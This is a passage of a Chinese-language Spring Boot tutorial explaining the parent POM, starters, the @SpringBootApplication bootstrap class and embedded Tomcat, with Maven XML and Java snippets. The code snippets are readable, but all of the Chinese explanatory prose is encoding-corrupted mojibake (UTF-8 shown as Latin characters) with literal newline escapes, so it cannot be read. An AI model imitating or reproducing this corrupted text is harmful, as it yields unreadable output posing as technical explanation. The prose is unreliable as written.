â‘£è¿è¡Œé¡¹ç›®\n\nç›´æ¥è¿è¡Œä¸»ç¨‹åº `MainApplication` ä¸­çš„ `main` æ–¹æ³•ï¼Œè®¿é—® `http://127.0.0.1:8080`ï¼Œå°†ä¼šè¾“å‡º`Hello, Spring Boot 2!`\n\n# äºŒã€å·¥ä½œæµç¨‹\n\nSpringBootå¸¦æ¥çš„å¥½å¤„ï¼š\n\n- èµ·æ­¥ä¾èµ–ï¼ˆç®€åŒ–ä¾èµ–é…ç½®ï¼‰\n  - ä¾èµ–é…ç½®çš„ä¹¦å†™ç®€åŒ–å°±æ˜¯é è¿™ä¸ªèµ·æ­¥ä¾èµ–è¾¾æˆçš„\n- è‡ªåŠ¨é…ç½®ï¼ˆç®€åŒ–å¸¸ç”¨å·¥ç¨‹ç›¸å…³é…ç½®ï¼‰\n  - é…ç½®è¿‡äºç¹çï¼Œä½¿ç”¨è‡ªåŠ¨é…ç½®å°±å¯ä»¥åšå“åº”çš„ç®€åŒ–ï¼Œä½†æ˜¯å†…éƒ¨è¿˜æ˜¯å¾ˆå¤æ‚çš„\n- è¾…åŠ©åŠŸèƒ½ï¼ˆå†…ç½®æœåŠ¡å™¨ï¼Œâ€¦â€¦ï¼‰\n  - æ¯”å¦‚æˆ‘ä»¬æ²¡æœ‰é…ç½®TomcatæœåŠ¡å™¨ï¼Œä½†æ˜¯èƒ½æ­£å¸¸è¿è¡Œã€‚\n\nä¸‹é¢ç»“åˆå…¥é—¨ç¨‹åºæ¥è¯´è¯´è¿™äº›ç®€åŒ–æ“ä½œéƒ½åœ¨å“ªäº›æ–¹é¢è¿›è¡Œä½“ç°çš„ï¼Œä¸€å…±åˆ†ä¸º4ä¸ªæ–¹é¢\n\n- parent\n- starter\n- å¼•å¯¼ç±»\n- å†…åµŒtomcat\n\n## 1.parent\n\n> SpringBoot å…³æ³¨åˆ°å¼€å‘è€…åœ¨è¿›è¡Œå¼€å‘æ—¶ï¼Œå¾€å¾€å¯¹ä¾èµ–ç‰ˆæœ¬çš„é€‰æ‹©å…·æœ‰å›ºå®šçš„æ­é…æ ¼å¼ï¼Œå¹¶ä¸”è¿™äº›ä¾èµ–ç‰ˆæœ¬çš„é€‰æ‹©è¿˜ä¸èƒ½ä¹±æ­é…ã€‚æ¯”å¦‚ A æŠ€æœ¯çš„ 2.0 ç‰ˆä¸ B æŠ€æœ¯çš„ 3.5 ç‰ˆå¯ä»¥åˆä½œåœ¨ä¸€èµ·ï¼Œä½†æ˜¯å’Œ B æŠ€æœ¯çš„ 3.7 ç‰ˆåˆå¹¶ä½¿ç”¨æ—¶å°±æœ‰å†²çªã€‚äºæ˜¯ SpringBoot åšäº†æ— æ•°ä¸ªæœ€åˆç†çš„æŠ€æœ¯ç‰ˆæœ¬æ­é…åˆ—è¡¨ï¼Œè¿™ä¸ªæŠ€æœ¯æ­é…åˆ—è¡¨çš„åå­—å«åš<font color=\"#ff0000\"><b>parent</b></font>ã€‚\n\nä¸€å¥è¯æ€»ç»“ï¼š<font color=\"#ff0000\"><b>ä½¿ç”¨parentå¯ä»¥å¸®åŠ©å¼€å‘è€…è¿›è¡Œç‰ˆæœ¬çš„ç»Ÿä¸€ç®¡ç†</b></font>\n\né‚£SpringBootåˆæ˜¯å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹çš„å‘¢ï¼Ÿå¯ä»¥æŸ¥é˜…SpringBootçš„é…ç½®æºç ï¼Œçœ‹åˆ°è¿™äº›å®šä¹‰\n\n- é¡¹ç›®ä¸­çš„pom.xmlä¸­ç»§æ‰¿äº†ä¸€ä¸ªåæ ‡\n\n```xml\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.5.4</version>\n</parent>\n```\n\n- æ‰“å¼€åå¯ä»¥æŸ¥é˜…åˆ°å…¶ä¸­åˆç»§æ‰¿äº†ä¸€ä¸ªåæ ‡\n\n```xml\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-dependencies</artifactId>\n    <version>2.5.4</version>\n</parent>\n```\n\n- è¿™ä¸ªåæ ‡ä¸­å®šä¹‰äº†ä¸¤ç»„ä¿¡æ¯ï¼Œ\n\n  - ç¬¬ä¸€ç»„æ˜¯å„å¼å„æ ·çš„**ä¾èµ–ç‰ˆæœ¬å·**\n\n    ```xml\n    <properties>\n        <activemq.version>5.16.3</activemq.version>\n        <aspectj.version>1.9.7</aspectj.version>\n        <assertj.version>3.19.0</assertj.version>\n        <javax-json.version>1.1.4</javax-json.version>\n        <javax-websocket.version>1.1</javax-websocket.version>\n        <jetty-el.version>9.0.48</jetty-el.version>\n        <junit.version>4.13.2</junit.version>\n        ......\n    </properties>\n    ```\n\n  - ç¬¬äºŒç»„æ˜¯å„å¼å„æ ·çš„çš„**ä¾èµ–åæ ‡ä¿¡æ¯**ã€‚å¯ä»¥çœ‹å‡ºä¾èµ–åæ ‡å®šä¹‰ä¸­æ²¡æœ‰å…·ä½“çš„ä¾èµ–ç‰ˆæœ¬å·ï¼Œè€Œæ˜¯å¼•ç”¨äº†ç¬¬ä¸€ç»„ä¿¡æ¯ä¸­å®šä¹‰çš„ä¾èµ–ç‰ˆæœ¬å±æ€§å€¼\n\n    ```xml\n    <dependencyManagement>\n        <dependencies>\n            <dependency>\n                <groupId>org.hibernate</groupId>\n                <artifactId>hibernate-core</artifactId>\n                <version>${hibernate.version}</version>\n            </dependency>\n            <dependency>\n                <groupId>junit</groupId>\n                <artifactId>junit</artifactId>\n                <version>${junit.version}</version>\n            </dependency>\n        </dependencies>\n    </dependencyManagement>\n    ```\n\n<font color=\"#ff0000\"><b>å…³æ³¨</b></font>ï¼šä¸Šé¢çš„ä¾èµ–åæ ‡å®šä¹‰æ˜¯å‡ºç°åœ¨\\<dependencyManagement>æ ‡ç­¾ä¸­çš„ï¼Œå…¶å®æ˜¯å¯¹å¼•ç”¨åæ ‡çš„ä¾èµ–ç®¡ç†ï¼Œå¹¶ä¸æ˜¯å®é™…ä½¿ç”¨çš„åæ ‡ã€‚å› æ­¤å½“ä½ çš„é¡¹ç›®ä¸­ç»§æ‰¿äº†è¿™ç»„parentä¿¡æ¯åï¼Œåœ¨ä¸ä½¿ç”¨å¯¹åº”åæ ‡çš„æƒ…å†µä¸‹ï¼Œè¿™ç»„å®šä¹‰æ˜¯ä¸ä¼šå…·ä½“å¯¼å…¥æŸä¸ªä¾èµ–çš„\n\n<font color=\"#ff0000\"><b>å…³æ³¨</b></font>ï¼šå› ä¸ºåœ¨mavenä¸­ç»§æ‰¿æœºä¼šåªæœ‰ä¸€æ¬¡ï¼Œä¸Šè¿°ç»§æ‰¿çš„æ ¼å¼è¿˜å¯ä»¥åˆ‡æ¢æˆå¯¼å…¥çš„å½¢å¼è¿›è¡Œï¼Œå¹¶ä¸”åœ¨é˜¿é‡Œäº‘çš„starteråˆ›å»ºå·¥ç¨‹æ—¶å°±ä½¿ç”¨äº†æ­¤ç§å½¢å¼\n\n```xml\n<dependencyManagement>\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-dependencies</artifactId>\n            <version>${spring-boot.version}</version>\n            <type>pom</type>\n            <scope>import</scope>\n        </dependency>\n    </dependencies>\n</dependencyManagement>\n```\n\n**æ€»ç»“**\n\n1. å¼€å‘SpringBootç¨‹åºè¦ç»§æ‰¿spring-boot-starter-parent\n2. spring-boot-starter-parentä¸­å®šä¹‰äº†è‹¥å¹²ä¸ªä¾èµ–ç®¡ç†\n3. ç»§æ‰¿parentæ¨¡å—å¯ä»¥é¿å…å¤šä¸ªä¾èµ–ä½¿ç”¨ç›¸åŒæŠ€æœ¯æ—¶å‡ºç°ä¾èµ–ç‰ˆæœ¬å†²çª\n4. ç»§æ‰¿parentçš„å½¢å¼ä¹Ÿå¯ä»¥é‡‡ç”¨å¼•å…¥ä¾èµ–çš„å½¢å¼å®ç°æ•ˆæœ\n\n## 2.starter\n\n> SpringBoot å…³æ³¨åˆ°å¼€å‘è€…åœ¨å®é™…å¼€å‘æ—¶ï¼Œå¯¹äºä¾èµ–åæ ‡çš„ä½¿ç”¨å¾€å¾€éƒ½æœ‰ä¸€äº›å›ºå®šçš„ç»„åˆæ–¹å¼ï¼Œæ¯”å¦‚ä½¿ç”¨ spring-webmvc å°±ä¸€å®šè¦ä½¿ç”¨ spring-webã€‚æ¯æ¬¡éƒ½è¦å›ºå®šæ­é…ç€å†™ï¼Œéå¸¸ç¹çã€‚äºæ˜¯ SpringBoot æŠŠæ‰€æœ‰çš„æŠ€æœ¯ä½¿ç”¨å›ºå®šæ­é…æ ¼å¼éƒ½ç»™å¼€å‘å‡ºæ¥ï¼Œä»¥åä½ ç”¨æŸä¸ªæŠ€æœ¯ï¼Œå°±ä¸ç”¨ä¸€æ¬¡å†™ä¸€å †ä¾èµ–äº†ï¼Œç›´æ¥ç”¨å›ºå®šæ­é…æ ¼å¼å°±å¥½äº†ã€‚è¿™ä¸ªå›ºå®šæŠ€æœ¯æ­é…çš„åå­—å«åš<font color=\"#ff0000\"><b>starter</b></font>ã€‚\n\nä¸€å¥è¯æ€»ç»“ï¼š<font color=\"#ff0000\"><b>ä½¿ç”¨starterå¯ä»¥å¸®åŠ©å¼€å‘è€…å‡å°‘ä¾èµ–é…ç½®</b></font>\n\né‚£SpringBootåˆæ˜¯å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹çš„å‘¢ï¼Ÿå¯ä»¥æŸ¥é˜…SpringBootçš„é…ç½®æºç ï¼Œçœ‹åˆ°è¿™äº›å®šä¹‰\n\n- é¡¹ç›®ä¸­çš„pom.xmlå®šä¹‰äº†ä½¿ç”¨SpringMVCæŠ€æœ¯ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å†™SpringMVCçš„åæ ‡ï¼Œè€Œæ˜¯æ·»åŠ äº†ä¸€ä¸ªåå­—ä¸­åŒ…å«starterçš„ä¾èµ–\n\n`command + shift + option + U`ï¼šä»¥å›¾çš„æ–¹å¼æ˜¾ç¤ºé¡¹ç›®ä¸­ä¾èµ–ä¹‹é—´çš„å…³ç³»ã€‚\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n- åœ¨spring-boot-starter-webä¸­åˆå®šä¹‰äº†è‹¥å¹²ä¸ªå…·ä½“ä¾èµ–çš„åæ ‡\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-json</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-tomcat</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-web</artifactId>\n        <version>5.3.9</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-webmvc</artifactId>\n        <version>5.3.9</version>\n        <scope>compile</scope>\n    </dependency>\n</dependencies>\n```\n\nå‘ç°é‡Œé¢æœ‰ä¸ª spring-boot-starter-jsonã€‚çœ‹åç§°å°±çŸ¥é“ï¼Œè¿™ä¸ªæ˜¯ä¸jsonæœ‰å…³çš„åæ ‡äº†ï¼Œä½†æ˜¯çœ‹åå­—å‘ç°å’Œæœ€åä¸¤ä¸ªåˆä¸å¤ªä¸€æ ·ï¼Œå®ƒçš„åå­—ä¸­ä¹Ÿæœ‰starterï¼Œæ‰“å¼€çœ‹çœ‹é‡Œé¢æœ‰ä»€ä¹ˆï¼Ÿ\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-web</artifactId>\n        <version>5.3.9</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>com.fasterxml.jackson.core</groupId>\n        <artifactId>jackson-databind</artifactId>\n        <version>2.12.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>com.fasterxml.jackson.datatype</groupId>\n        <artifactId>jackson-datatype-jdk8</artifactId>\n        <version>2.12.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>com.fasterxml.jackson.datatype</groupId>\n        <artifactId>jackson-datatype-jsr310</artifactId>\n        <version>2.12.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>com.fasterxml.jackson.module</groupId>\n        <artifactId>jackson-module-parameter-names</artifactId>\n        <version>2.12.4</version>\n        <scope>compile</scope>\n    </dependency>\n</dependencies>\n```\n\næˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªstarterä¸­åˆåŒ…å«äº†è‹¥å¹²ä¸ªåæ ‡ï¼Œå…¶å®å°±æ˜¯ä½¿ç”¨SpringMVCå¼€å‘é€šå¸¸éƒ½ä¼šä½¿ç”¨åˆ°Jsonï¼Œä½¿ç”¨jsonåˆç¦»ä¸å¼€è¿™é‡Œé¢å®šä¹‰çš„è¿™äº›åæ ‡ï¼Œçœ‹æ¥è¿˜çœŸæ˜¯æ–¹ä¾¿ï¼ŒSpringBootæŠŠæˆ‘ä»¬å¼€å‘ä¸­ä½¿ç”¨çš„ä¸œè¥¿èƒ½ç”¨åˆ°çš„éƒ½ç»™æå‰åšå¥½äº†ã€‚ä½ ä»”ç»†çœ‹å®Œä¼šå‘ç°ï¼Œé‡Œé¢æœ‰ä¸€äº›ä½ æ²¡ç”¨è¿‡çš„ã€‚çš„ç¡®ä¼šå‡ºç°è¿™ç§è¿‡é‡å¯¼å…¥çš„å¯èƒ½æ€§ï¼Œæ²¡å…³ç³»ï¼Œå¯ä»¥é€šè¿‡mavenä¸­çš„æ’é™¤ä¾èµ–å‰”é™¤æ‰ä¸€éƒ¨åˆ†ã€‚ä¸è¿‡ä½ ä¸ç®¡å®ƒä¹Ÿæ²¡äº‹ï¼Œå¤§ä¸äº†å°±æ˜¯è¿‡é‡å¯¼å…¥å‘—ã€‚\n\nåˆ°è¿™é‡ŒåŸºæœ¬ä¸Šå¾—åˆ°äº†ä¸€ä¸ªä¿¡æ¯ï¼Œä½¿ç”¨starterå¯ä»¥å¸®å¼€å‘è€…å¿«é€Ÿé…ç½®ä¾èµ–å…³ç³»ã€‚ä»¥å‰å†™ä¾èµ–3ä¸ªåæ ‡çš„ï¼Œç°åœ¨å†™å¯¼å…¥ä¸€ä¸ªå°±æå®šäº†ï¼Œå°±æ˜¯åŠ é€Ÿä¾èµ–é…ç½®çš„ã€‚\n\n**starterä¸parentçš„åŒºåˆ«**\n\nâ€‹\tæœ¦æœ¦èƒ§èƒ§ä¸­æ„Ÿè§‰starterä¸parentå¥½åƒéƒ½æ˜¯å¸®åŠ©æˆ‘ä»¬ç®€åŒ–é…ç½®çš„ï¼Œä½†æ˜¯åŠŸèƒ½åˆä¸ä¸€æ ·ï¼Œæ¢³ç†ä¸€ä¸‹ã€‚\n\nâ€‹\t<font color=\"#ff0000\"><b>starter</b></font>æ˜¯ä¸€ä¸ªåæ ‡ä¸­å®šäº†è‹¥å¹²ä¸ªåæ ‡ï¼Œä»¥å‰å†™å¤šä¸ªçš„ï¼Œç°åœ¨å†™ä¸€ä¸ªï¼Œ<font color=\"#ff0000\"><b>æ˜¯ç”¨æ¥å‡å°‘ä¾èµ–é…ç½®çš„ä¹¦å†™é‡çš„</b></font>\n\nâ€‹\t<font color=\"#ff0000\"><b>parent</b></font>æ˜¯å®šä¹‰äº†å‡ ç™¾ä¸ªä¾èµ–ç‰ˆæœ¬å·ï¼Œä»¥å‰å†™ä¾èµ–éœ€è¦è‡ªå·±æ‰‹å·¥æ§åˆ¶ç‰ˆæœ¬ï¼Œç°åœ¨ç”±SpringBootç»Ÿä¸€ç®¡ç†ï¼Œ\n\nè¿™æ ·å°±ä¸å­˜åœ¨ç‰ˆæœ¬å†²çªäº†ï¼Œ<font color=\"#ff0000\"><b>æ˜¯ç”¨æ¥å‡å°‘ä¾èµ–å†²çªçš„</b></font>\n\n**å®é™…å¼€å‘åº”ç”¨æ–¹å¼**\n\n- å®é™…å¼€å‘ä¸­å¦‚æœéœ€è¦ç”¨ä»€ä¹ˆæŠ€æœ¯ï¼Œå…ˆå»æ‰¾æœ‰æ²¡æœ‰è¿™ä¸ªæŠ€æœ¯å¯¹åº”çš„starter\n\n  - å¦‚æœæœ‰å¯¹åº”çš„starterï¼Œç›´æ¥å†™starterï¼Œè€Œä¸”æ— éœ€æŒ‡å®šç‰ˆæœ¬ï¼Œç‰ˆæœ¬ç”±parentæä¾›\n  - å¦‚æœæ²¡æœ‰å¯¹åº”çš„starterï¼Œæ‰‹å†™åæ ‡å³å¯\n\n- å®é™…å¼€å‘ä¸­å¦‚æœå‘ç°åæ ‡å‡ºç°äº†å†²çªç°è±¡ï¼Œç¡®è®¤ä½ è¦ä½¿ç”¨çš„å¯è¡Œçš„ç‰ˆæœ¬å·ï¼Œä½¿ç”¨æ‰‹å·¥ä¹¦å†™çš„æ–¹å¼æ·»åŠ å¯¹åº”ä¾èµ–ï¼Œè¦†ç›–SpringBootæä¾›ç»™æˆ‘ä»¬çš„é…ç½®ç®¡ç†\n\n  - æ–¹å¼ä¸€ï¼šç›´æ¥å†™åæ ‡\n  - æ–¹å¼äºŒï¼šè¦†ç›–\\<properties>ä¸­å®šä¹‰çš„ç‰ˆæœ¬å·ï¼Œåœ¨å½“å‰é¡¹ç›®é‡Œé¢é‡å†™é…ç½®ï¼Œå¦‚ä¸‹é¢çš„ä»£ç \n\n  ```xml\n  <properties>\n      <mysql.version>5.1.43</mysql.version>\n  </properties>\n  ```\n\n<font color=\"#f0f\"><b>æ¸©é¦¨æç¤º</b></font>\n\nâ€‹\t[SpringBootå®˜æ–¹](https://docs.spring.io/spring-boot/docs/current/reference/html/using.html#using.build-systems.starters)ç»™å‡ºäº†å¥½å¤šä¸ªstarterçš„å®šä¹‰ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä½¿ç”¨ï¼Œè€Œä¸”åç§°éƒ½æ˜¯å¦‚ä¸‹æ ¼å¼\n\n```JAVA\nå‘½åè§„åˆ™ï¼šspring-boot-starter-æŠ€æœ¯åç§°\n```\n\né‚£éå®˜æ–¹å®šä¹‰çš„ä¹Ÿæœ‰å—ï¼Ÿæœ‰çš„ï¼Œè€Œä¸”åç§°éƒ½æ˜¯å¦‚ä¸‹æ ¼å¼\n\n```java\nå‘½åè§„åˆ™ï¼šæŠ€æœ¯åç§°-spring-boot-starter \n   æˆ–è€…: æŠ€æœ¯åç§°-boot-starterï¼ˆæŠ€æœ¯åç§°è¿‡é•¿ï¼Œç®€åŒ–å‘½åï¼‰\n```\n\n**æ€»ç»“**\n\n1. å¼€å‘SpringBootç¨‹åºéœ€è¦å¯¼å…¥åæ ‡æ—¶é€šå¸¸å¯¼å…¥å¯¹åº”çš„starter\n2. æ¯ä¸ªä¸åŒçš„starteræ ¹æ®åŠŸèƒ½ä¸åŒï¼Œé€šå¸¸åŒ…å«å¤šä¸ªä¾èµ–åæ ‡\n3. ä½¿ç”¨starterå¯ä»¥å®ç°å¿«é€Ÿé…ç½®çš„æ•ˆæœï¼Œè¾¾åˆ°ç®€åŒ–é…ç½®çš„ç›®çš„\n\n## 3.å¼•å¯¼ç±»\n\nç¨‹åºæ˜¯å¦‚ä½•è¿è¡Œçš„ã€‚ç›®å‰ç¨‹åºè¿è¡Œçš„å…¥å£å°±æ˜¯SpringBootå·¥ç¨‹åˆ›å»ºæ—¶è‡ªå¸¦çš„é‚£ä¸ªç±»äº†ï¼Œå¸¦æœ‰mainæ–¹æ³•çš„é‚£ä¸ªç±»ï¼Œè¿è¡Œè¿™ä¸ªç±»å°±å¯ä»¥å¯åŠ¨SpringBootå·¥ç¨‹çš„è¿è¡Œ\n\n```java\n@SpringBootApplication\npublic class SpringbootApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(SpringbootApplication.class, args);\n    }\n}\n```\n\nSpringBootæœ¬èº«æ˜¯ä¸ºäº†åŠ é€ŸSpringç¨‹åºçš„å¼€å‘çš„ï¼Œè€ŒSpringç¨‹åºè¿è¡Œçš„åŸºç¡€æ˜¯éœ€è¦åˆ›å»ºè‡ªå·±çš„Springå®¹å™¨å¯¹è±¡ï¼ˆIoCå®¹å™¨ï¼‰å¹¶å°†æ‰€æœ‰çš„å¯¹è±¡äº¤ç»™Springçš„å®¹å™¨ç®¡ç†ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„Beanã€‚å½“è¿™ä¸ªç±»è¿è¡Œåå°±ä¼šäº§ç”Ÿä¸€ä¸ªSpringå®¹å™¨å¯¹è±¡ï¼Œå¹¶ä¸”å¯ä»¥å°†è¿™ä¸ªå¯¹è±¡ä¿å­˜èµ·æ¥ï¼Œé€šè¿‡å®¹å™¨å¯¹è±¡ç›´æ¥æ“ä½œBeanã€‚\n\n```java\n@SpringBootApplication\npublic class SpringbootApplication {\n  public static void main(String[] args) {\n      //1ã€è¿”å›æˆ‘ä»¬IOCå®¹å™¨\n      ConfigurableApplicationContext run = SpringApplication.run(MainApplication.class, args);\n\n      //2ã€æŸ¥çœ‹å®¹å™¨é‡Œé¢çš„ç»„ä»¶\n      String[] names = run.getBeanDefinitionNames();\n      for (String name : names) {\n          System.out.println(name);\n      }\n  }\n}\n```\n\nä½œä¸ºä¸€ä¸ªå¼•å¯¼ç±»æœ€å…¸å‹çš„ç‰¹å¾å°±æ˜¯å½“å‰ç±»ä¸Šæ–¹å£°æ˜äº†ä¸€ä¸ªæ³¨è§£<font color=\"#ff0000\"><b>@SpringBootApplication</b></font>\n\n**æ€»ç»“**\n\n1. SpringBootå·¥ç¨‹æä¾›å¼•å¯¼ç±»ç”¨æ¥å¯åŠ¨ç¨‹åº\n2. SpringBootå·¥ç¨‹å¯åŠ¨ååˆ›å»ºå¹¶åˆå§‹åŒ–Springå®¹å™¨\n\n## 4.å†…åµŒtomcat\n\nå½“å‰æˆ‘ä»¬åšçš„SpringBootå…¥é—¨æ¡ˆä¾‹å‹¾é€‰äº†Spirng-webçš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯¼å…¥äº†å¯¹åº”çš„starterã€‚\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\nâ€‹\tSpringBootå‘ç°ï¼Œæ—¢ç„¶ä½ è¦åšwebç¨‹åºï¼Œè‚¯å®šç¦»ä¸å¼€ä½¿ç”¨webæœåŠ¡å™¨ï¼Œæˆ‘å†å¸®ä½ æä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œä½ è¦æ„¿æ„ç”¨çš„ï¼Œç›´æ¥ä½¿ç”¨å°±å¥½äº†ï¼Œå¹²è„†æˆ‘å†å¤šç»™ä½ å‡ ç§é€‰æ‹©ï¼Œä½ éšä¾¿åˆ‡æ¢ã€‚ä¸‡ä¸€ä½ ä¸æƒ³ç”¨æˆ‘ç»™ä½ æä¾›çš„ï¼Œä¹Ÿè¡Œï¼Œä½ å¯ä»¥è‡ªå·±æã€‚\n\nâ€‹\tç”±äºè¿™ä¸ªåŠŸèƒ½ä¸å±äºç¨‹åºçš„ä¸»ä½“åŠŸèƒ½ï¼Œå¯ç”¨å¯ä¸ç”¨ï¼Œäºæ˜¯ä¹SpringBootå°†å…¶å®šä½æˆè¾…åŠ©åŠŸèƒ½ã€‚\n\nâ€‹\tä¸‹é¢å°±å›´ç»•ç€è¿™ä¸ªå†…ç½®çš„webæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯å†…ç½®çš„tomcatæœåŠ¡å™¨æ¥ç ”ç©¶å‡ ä¸ªé—®é¢˜\n\n1. è¿™ä¸ªæœåŠ¡å™¨åœ¨ä»€ä¹ˆä½ç½®å®šä¹‰çš„ï¼Ÿ\n2. è¿™ä¸ªæœåŠ¡å™¨æ˜¯æ€ä¹ˆè¿è¡Œçš„ï¼Ÿ\n3. è¿™ä¸ªæœåŠ¡å™¨å¦‚æœæƒ³æ¢æ€ä¹ˆæ¢ï¼Ÿ\n\n**å†…åµŒTomcatå®šä¹‰ä½ç½®**\n\nâ€‹\tè¯´åˆ°å®šä¹‰çš„ä½ç½®ï¼Œæˆ‘ä»¬å°±æƒ³ï¼Œå¦‚æœæˆ‘ä»¬ä¸å¼€å‘webç¨‹åºï¼Œç”¨çš„ç€webæœåŠ¡å™¨å—ï¼Ÿè‚¯å®šç”¨ä¸ç€å•Šã€‚é‚£å¦‚æœè¿™ä¸ªä¸œè¥¿è¢«åŠ å…¥åˆ°ä½ çš„ç¨‹åºä¸­ï¼Œä¼´éšç€ä»€ä¹ˆæŠ€æœ¯è¿›æ¥çš„å‘¢ï¼Ÿè‚¯å®šæ˜¯webç›¸å…³çš„åŠŸèƒ½å•Šï¼Œæ²¡é”™ï¼Œå°±æ˜¯å‰é¢å¯¼å…¥çš„webç›¸å…³çš„starteråšçš„è¿™ä»¶äº‹ã€‚\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\nâ€‹\tæ‰“å¼€æŸ¥çœ‹webçš„starterå¯¼å…¥äº†å“ªäº›ä¸œè¥¿\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-json</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-tomcat</artifactId>\n        <version>2.5.4</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-web</artifactId>\n        <version>5.3.9</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-webmvc</artifactId>\n        <version>5.3.9</version>\n        <scope>compile</scope>\n    </dependency>\n</dependencies>\n```\n\nâ€‹\tç¬¬ä¸‰ä¸ªä¾èµ–å°±æ˜¯è¿™ä¸ªtomcatå¯¹åº”çš„ä¸œè¥¿äº†ï¼Œå±…ç„¶ä¹Ÿæ˜¯ä¸€ä¸ªstarterï¼Œå†æ‰“å¼€çœ‹çœ‹\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>jakarta.annotation</groupId>\n        <artifactId>jakarta.annotation-api</artifactId>\n        <version>1.3.5</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.apache.tomcat.embed</groupId>\n        <artifactId>tomcat-embed-core</artifactId>\n        <version>9.0.52</version>\n        <scope>compile</scope>\n        <exclusions>\n            <exclusion>\n                <artifactId>tomcat-annotations-api</artifactId>\n                <groupId>org.apache.tomcat</groupId>\n            </exclusion>\n        </exclusions>\n    </dependency>\n    <dependency>\n        <groupId>org.apache.tomcat.embed</groupId>\n        <artifactId>tomcat-embed-el</artifactId>\n        <version>9.0.52</version>\n        <scope>compile</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.apache.tomcat.embed</groupId>\n        <artifactId>tomcat-embed-websocket</artifactId>\n        <version>9.0.52</version>\n        <scope>compile</scope>\n        <exclusions>\n            <exclusion>\n                <artifactId>tomcat-annotations-api</artifactId>\n                <groupId>org.apache.tomcat</groupId>\n            </exclusion>\n        </exclusions>\n    </dependency>\n</dependencies>\n```\n\nè¿™é‡Œé¢æœ‰ä¸€ä¸ªæ ¸å¿ƒçš„åæ ‡ï¼Œtomcat-embed-coreï¼Œå«åštomcatå†…åµŒæ ¸å¿ƒã€‚å°±æ˜¯è¿™ä¸ªä¸œè¥¿æŠŠtomcatåŠŸèƒ½å¼•å…¥åˆ°äº†æˆ‘ä»¬çš„ç¨‹åºä¸­ã€‚ç›®å‰è§£å†³äº†ç¬¬ä¸€ä¸ªé—®é¢˜ã€‚è°æŠŠtomcatå¼•å…¥åˆ°ç¨‹åºä¸­çš„ï¼Ÿspring-boot-starter-webä¸­çš„spring-boot-starter-tomcatåšçš„ã€‚\n\n**å†…åµŒTomcatè¿è¡ŒåŸç†**\n\nTomcatæœåŠ¡å™¨æ˜¯ä¸€æ¬¾è½¯ä»¶ï¼Œè€Œä¸”æ˜¯ä¸€æ¬¾ä½¿ç”¨javaè¯­è¨€å¼€å‘çš„è½¯ä»¶ä¸‹é¢çš„é—®é¢˜æ¥äº†ï¼Œæ—¢ç„¶æ˜¯ä½¿ç”¨javaè¯­è¨€å¼€å‘çš„ï¼Œè¿è¡Œçš„æ—¶å€™è‚¯å®šç¬¦åˆjavaç¨‹åºè¿è¡Œçš„åŸç†ï¼Œjavaç¨‹åºè¿è¡Œé 